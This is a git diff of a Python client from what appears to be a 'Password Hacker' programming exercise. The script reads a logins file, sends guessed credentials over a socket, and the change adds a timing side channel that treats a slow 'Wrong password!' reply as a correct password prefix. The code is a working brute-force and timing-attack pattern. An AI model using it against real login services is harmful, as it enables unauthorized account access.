@@ -2,11 +2,12 @@ import string
 import sys
 import socket
 import json
+import time
 
 args = sys.argv
 address = (args[1], int(args[2]))
 
-logins = open('logins.txt', 'r')
+logins = open('C:\\Users\\shesl\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', 'r')
 
 client_socket = socket.socket()
 client_socket.connect(address)
@@ -42,10 +43,15 @@ while flag:
 
         client_socket.send(logon_msg_bytes)
 
+        start = time.perf_counter()
+
         response_json = client_socket.recv(1024).decode()
         response = json.loads(response_json)
 
-        if response["result"] == "Exception happened during login":
+        end = time.perf_counter()
+        response_time = end - start
+
+        if response["result"] == "Wrong password!" and response_time >= 0.1:
             pwd = logon_msg['password']
             break
         elif response["result"] == "Connection success!":
